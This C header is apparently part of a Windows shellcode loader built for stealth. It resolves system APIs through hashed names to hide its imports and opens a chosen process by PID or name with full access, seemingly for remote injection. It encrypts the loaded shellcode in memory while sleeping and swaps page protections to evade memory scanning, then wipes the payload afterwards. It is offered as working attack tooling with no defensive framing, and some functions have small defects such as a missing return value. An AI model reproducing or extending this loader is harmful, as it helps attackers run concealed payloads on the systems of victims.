#pragma once
#include "../../includes/core/core.h"
#include "../../includes/crypt/crypt.h"
#include "../../includes/core/nt.h"
#include "../../includes/apis/apis.h"
#include <tlhelp32.h>






#ifdef REMOTE

static inline void resolve_snapshot_apis(void) {
    if (!g_ldr->apis->pCreateToolhelp32Snapshot)
        g_ldr->apis->pCreateToolhelp32Snapshot = (pCreateToolhelp32Snapshot)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATETOOLHELP32SNAPSHOT);
    if (!g_ldr->apis->Process32NextW)
        g_ldr->apis->Process32NextW = (pProcess32Next)GetProc(g_ldr->apis->modules.kernel32, HASHED_PROCESS32NEXTW);
    if (!g_ldr->apis->Process32FirstW)
        g_ldr->apis->Process32FirstW = (pProcess32First)GetProc(g_ldr->apis->modules.kernel32, HASHED_PROCESS32FIRSTW);
}

static inline HANDLE open_process_by_pid(DWORD pid) {
    HANDLE h = g_ldr->apis->OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    return h;

}

static inline HANDLE open_process_by_name(PWCHAR name, PDWORD chosenPid) {
    resolve_snapshot_apis();

    HANDLE s = g_ldr->apis->pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE hProc = NULL;

    if (g_ldr->apis->Process32FirstW(s, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, name) == 0) {
                hProc = open_process_by_pid(pe.th32ProcessID);
                if (hProc) {
                    *chosenPid = pe.th32ProcessID;
                    g_ldr->apis->CloseHandle(s);
                    return hProc;
                }
            }
        } while (g_ldr->apis->Process32NextW(s, &pe));
    }
    g_ldr->apis->CloseHandle(s);
    return hProc;
}

static inline HANDLE resolve_target_process(PDWORD chosenPid) {
    if (g_ldr->config->remoteSettings.pid != 0) {
        HANDLE h = open_process_by_pid(g_ldr->config->remoteSettings.pid);
        if (h) {
            *chosenPid = g_ldr->config->remoteSettings.pid;
            return h;
        }
        DBGA("[!] Failed to open PID %lu\n", g_ldr->config->remoteSettings.pid);
    }

    if (g_ldr->config->remoteSettings.ProcessName[0] != L'\0') {
        HANDLE h = open_process_by_name(g_ldr->config->remoteSettings.ProcessName, chosenPid);
        if (h)
            return h;
        DBGA("[!] Failed to open process by name\n");
    }

    return NULL;
}

#endif



static inline PPEB GetPeb() {
#if defined(_WIN64) || defined(__x86_64__)
    return (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)|| defined(__i386__)
    return (PPEB)__readfsdword(0x30);
#endif
}

BOOL ensure_sleep_apis() {
    if (!g_ldr->apis->CreateWaitableTimerW)
        g_ldr->apis->CreateWaitableTimerW = (pCreateWaitableTimerW)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEWAITABLETIMERW);
    if (!g_ldr->apis->SetWaitableTimer)
        g_ldr->apis->SetWaitableTimer = (pSetWaitableTimer)GetProc(g_ldr->apis->modules.kernel32, HASHED_SETWAITABLETIMER);
    if (!g_ldr->apis->WaitForSingleObject)
        g_ldr->apis->WaitForSingleObject = (pWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_WAITFORSINGLEOBJECT);
    if(!g_ldr->apis->CloseHandle)
        g_ldr->apis->CloseHandle = (pCloseHandle)GetProc(g_ldr->apis->modules.kernel32, HASHED_CLOSEHANDLE);
    if (!g_ldr->apis->VirtualProtect)
        g_ldr->apis->VirtualProtect = (pVirtualProtect)GetProc(g_ldr->apis->modules.kernel32, HASHED_VIRTUALPROTECT);
}

static inline void do_sleep(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
    if (time == 0) return;
    DBGA("[*] Sleeping for %lu Seconds\n", time);
    DWORD old;
#ifdef LOCAL
    DBGA("[*] Encrypting shellcode");
    g_ldr->apis->VirtualProtect(Shellcode, ShellcodeSize, PAGE_READWRITE, &old);
    crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
        sizeof(g_ldr->config->EncryptionKey),
        g_ldr->config->Nonce,
        sizeof(g_ldr->config->Nonce));
#endif
    

    HANDLE hTimer = g_ldr->apis->CreateWaitableTimerW(NULL, TRUE, NULL);
    if (!hTimer) return;
    LARGE_INTEGER li;
    li.QuadPart = -(LONGLONG)time * 10000; 
    g_ldr->apis->SetWaitableTimer(hTimer, &li, 0, NULL, NULL, FALSE);
    g_ldr->apis->WaitForSingleObject(hTimer, INFINITE);
    g_ldr->apis->CloseHandle(hTimer);
#ifdef LOCAL
    DBGA("[*] Decrypting shellcode");
    crypt_ecrypt_decrypt((unsigned char*)Shellcode, ShellcodeSize, g_ldr->config->EncryptionKey,
        sizeof(g_ldr->config->EncryptionKey),
        g_ldr->config->Nonce,
        sizeof(g_ldr->config->Nonce));
    g_ldr->apis->VirtualProtect(Shellcode, ShellcodeSize, old, &old);
#endif
    return;
}

static inline void ldr_sleep(DWORD time) {
    do_sleep(time, NULL, NULL);
}

static inline void ldr_sleep_encrypt_heap(DWORD time, LPVOID Shellcode, SIZE_T ShellcodeSize) {
    do_sleep(time, Shellcode, ShellcodeSize);
}


static inline void clear_payload(LPVOID addr, DWORD size) {
    volatile unsigned char* p = (volatile unsigned char*)addr;
    for (DWORD i = 0; i < size; i++) p[i] = 0;
#ifndef PAYLOAD_SECTION_DATA
    g_ldr->apis->LocalFree(addr);
#endif
}